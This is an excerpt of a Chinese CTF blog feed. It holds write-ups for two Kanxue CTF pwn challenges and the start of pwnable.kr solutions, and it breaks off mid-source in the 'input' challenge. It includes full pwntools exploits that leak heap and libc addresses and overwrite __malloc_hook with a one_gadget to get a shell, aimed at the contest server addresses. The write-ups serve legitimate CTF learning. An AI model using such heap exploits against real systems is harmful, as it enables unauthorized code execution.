    <content type="html"><![CDATA[<p>虽然毕设已经接近尾声而且感觉很凉, 但还是阻挡不了我做pwn题的决心啊. 参与了下看雪今年的CTF, 做出了pwn其中一道, 还有一道是赛后根据比赛的思路写出来了(fuck, 比赛思路是对的, 但是感觉自己打比赛时体力不太跟得上, 所以就没坚持下去, 还是要锻炼身体2333). 记录下思路与exp.</p><h1 id="拯救单身狗"><a href="#拯救单身狗" class="headerlink" title="拯救单身狗"></a>拯救单身狗</h1><p>出题战队: 404gg</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这道题开了所有保护, 这对于第一次看到保护全开的萌新本新来说, 着实吓了一跳. 但转念一想题目既然出了肯定是有姿势绕过的, 于是google学到了覆写<code>malloc_hook</code>的新姿势, 盘了两天, 终于给盘出来了. 思路大概就是存储单身狗与lucky狗的全局指针数组的访问没有检查下标, 导致可以越界更改lucky狗结构体中的指针变量, 导致了任意地址写. 同时也导致了堆地址的泄露, 但是泄露的堆地址最后一位是被我们输入时的换行符给替换了, 经过<code>afang</code>师傅的指点, 最后爆破了最后一位（其实不一定要对的, 只要是合法的堆地址就行. 于是整理一下我们可以</p><ol><li>任意地址写</li><li>leak一个堆地址</li></ol><p>然后为了得知<code>malloc_hook</code>地址, 我们还需要一个libc地址. 我的思路是利用非<code>fastbin</code>在释放时会将libc地址写到<code>chunk</code>上, 然后再申请就可以得到一个libc地址. 于是我先申请很大堆空间（这里申请了很多single dog 2333 貌似不合题意）, 防止我们后面构造<code>fake chunk</code>的时候写到了<code>main_arena</code>. 然后在申请到的堆空间里利用任意地址写构造可以绕过<code>free</code>检查的<code>fake chunk</code>, 并且size要大于0x402. 因为测试所知目标上libc版本较高有<code>tcache</code>(lm0963师傅指点), 大于0x402的chunk在free时就不会进入tcache. 接着再<code>malloc</code>就可以leak出一个libc地址了. 接下来就是算出malloc_hook地址进行覆写, 再调用一次malloc就getshell. exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> local &gt; <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">"./apwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"211.159.175.39"</span>,<span class="number">8686</span>)</span><br><span class="line">elf = ELF(<span class="string">'./apwn'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_single</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name:\n"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_lucky</span><span class="params">(name, pname)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name\n"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">"name\n"</span>)</span><br><span class="line">    p.sendline(pname)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_single</span><span class="params">(index, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"which?\n"</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">"luck.\n"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_lucky</span><span class="params">(index, name, pname)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"which?\n"</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">"name?\n"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">"name\n"</span>)</span><br><span class="line">    p.sendline(pname)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_single_multi</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        create_single(<span class="string">"mads"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, """b main\ncontinue""")</span></span><br><span class="line">create_single(<span class="string">"mads"</span>)</span><br><span class="line">create_lucky(<span class="string">"mads"</span>, <span class="string">"xixi"</span>)</span><br><span class="line">create_single_multi(<span class="number">70</span>)</span><br><span class="line">create_single(<span class="string">"mads"</span>)</span><br><span class="line"><span class="comment">#save()</span></span><br><span class="line">edit_single(<span class="string">"80"</span>,<span class="string">""</span>)</span><br><span class="line">p.recvuntil(<span class="string">"new name: "</span>)</span><br><span class="line">h1_addr = u64(<span class="string">'\x00'</span> + p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)[<span class="number">1</span>:])</span><br><span class="line">log.info(<span class="string">"heap addr: "</span> + hex(h1_addr))</span><br><span class="line">h1_size_addr = h1_addr - <span class="number">8</span></span><br><span class="line">edit_single(<span class="string">"80"</span>, p64(h1_size_addr))</span><br><span class="line">edit_lucky(<span class="string">"0"</span>, <span class="string">"mads"</span>, p64(<span class="number">288</span>*<span class="number">5</span> - <span class="number">48</span> + <span class="number">1</span>))</span><br><span class="line">edit_single(<span class="string">"80"</span>, p64(h1_addr))</span><br><span class="line">next_size_addr = h1_addr - <span class="number">16</span> + <span class="number">1440</span> + <span class="number">8</span> - <span class="number">48</span></span><br><span class="line">edit_single(<span class="string">"80"</span>, p64(next_size_addr))</span><br><span class="line">edit_lucky(<span class="string">"0"</span>, <span class="string">"mads"</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">edit_single(<span class="string">"80"</span>, p64(h1_addr))</span><br><span class="line"><span class="comment">#edit_single("80","")</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">save()</span><br><span class="line">create_single(<span class="string">""</span>)</span><br><span class="line">edit_single(<span class="string">"71"</span>,<span class="string">"aaaaaab"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ab\n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">libc_base = libc_base - <span class="number">0x3ec0e0</span></span><br><span class="line">log.success( <span class="string">"libc base: "</span>+ hex(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"malloc_hook: "</span> + hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">edit_single(<span class="string">"80"</span>, p64(malloc_hook))</span><br><span class="line">edit_lucky(<span class="string">"0"</span>, <span class="string">"mads"</span>, p64(one))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="c-and-cpp"><a href="#c-and-cpp" class="headerlink" title="c and cpp"></a>c and cpp</h1><p>出题战队: 2019</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>这题是最后看wp时发现思路和我当时想的差不多, 于是赶紧合上wp, 调出exp 233. 想回去睡觉了就不啰嗦了(Mon 21:35), 直接上EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">pc=<span class="string">'./candcpp'</span></span><br><span class="line">remote_addr=[<span class="string">'154.8.222.144'</span>, <span class="number">9999</span>]</span><br><span class="line">aslr=<span class="keyword">True</span></span><br><span class="line">context.log_level=<span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./candcpp'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'c')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(l, d)</span>:</span></span><br><span class="line">    ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'string\n'</span>)</span><br><span class="line">    sl(str(l))</span><br><span class="line">    ru(<span class="string">'string\n'</span>)</span><br><span class="line">    sl(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'string\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    main_addr = <span class="number">0x4009A0</span></span><br><span class="line">    name_addr = <span class="number">0x602328</span></span><br><span class="line">    leak_addr = <span class="number">0x400E10</span></span><br><span class="line">    one_gadget = <span class="number">0xf02a4</span></span><br><span class="line">    ru(<span class="string">'name: '</span>)</span><br><span class="line">    sl(p64(leak_addr) + p64(main_addr))</span><br><span class="line">    malloc(<span class="number">1</span>, <span class="string">'AAAA'</span>*<span class="number">9</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    malloc(<span class="number">470</span>,<span class="string">'A'</span>*(<span class="number">480</span> - <span class="number">22</span> - <span class="number">15</span>) + p64(name_addr + <span class="number">8</span>) + <span class="string">'A'</span>*<span class="number">7</span> + p64(name_addr))</span><br><span class="line">    raw_input()</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    libc_base = int(ru(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">0x6f690</span></span><br><span class="line">    lg(<span class="string">"lib"</span>,libc_base)</span><br><span class="line">    ru(<span class="string">'name: '</span>)</span><br><span class="line">    sl(p64(libc_base + one_gadget) + p64(main_addr))</span><br><span class="line">    malloc(<span class="number">1</span>, <span class="string">'AAAA'</span>*<span class="number">9</span>)</span><br><span class="line">    malloc(<span class="number">470</span>,<span class="string">'A'</span>*(<span class="number">480</span> - <span class="number">22</span> - <span class="number">15</span>) + p64(name_addr + <span class="number">8</span>) + <span class="string">'A'</span>*<span class="number">7</span> + p64(name_addr))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>EXP 模版抄了师傅们的, 请师傅们不要打我啊.</p><p>好了, 回去撸铁了!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽然毕设已经接近尾声而且感觉很凉, 但还是阻挡不了我做pwn题的决心啊. 参与了下看雪今年的CTF, 做出了pwn其中一道, 还有一道是赛后根据比赛的思路写出来了(fuck, 比赛思路是对的, 但是感觉自己打比赛时体力不太跟得上, 所以就没坚持下去, 还是要锻炼身体2333
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>从零开刷PWNABLE.KR系列-random</title>
    <link href="http://lxzmads.github.io/2019/03/04/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%88%B7PWNABLE.KR%E7%B3%BB%E5%88%97-random/"/>
    <id>http://lxzmads.github.io/2019/03/04/从零开刷PWNABLE.KR系列-random/</id>
    <published>2019-03-03T16:00:00.000Z</published>
    <updated>2019-03-25T13:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>Daddy, teach me how to use random value in programming!</p><p>ssh <a href="mailto:random@pwnable.kr" target="_blank" rel="noopener">random@pwnable.kr</a> -p2222 (pw:guest)</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>常规检查.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/home/random/random'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure><p>同样给了源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出是<code>rand</code>函数的误用, 看看<code>man pages</code>怎么说,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">       The rand() function returns a pseudo-random integer in the range 0 to RAND_MAX inclusive (i.e., the mathemati‐</span><br><span class="line">       cal range [0, RAND_MAX]).</span><br><span class="line"></span><br><span class="line">       The srand() function sets its argument as the seed for a new sequence of pseudo-random integers to be returned</span><br><span class="line">       by rand().  These sequences are repeatable by calling srand() with the same seed value.</span><br><span class="line"></span><br><span class="line">       **If no seed value is provided, the rand() function is automatically seeded with a value of 1**.</span><br></pre></td></tr></table></figure><p>所以我们写个小程序就能获得<code>random</code>的值了, 之后就不细说.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, <span class="number">0xdeadbeef</span> ^ rand());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mommy, I thought libc random is unpredictable... */</span></span><br></pre></td></tr></table></figure><h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><p>Mom? how can I pass my input to a computer program?</p><p>ssh <a href="mailto:input2@pwnable.kr" target="_blank" rel="noopener">input2@pwnable.kr</a> -p2222 (pw:guest)</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>常规检查</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码如下, 可以看出是道编程题…<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span 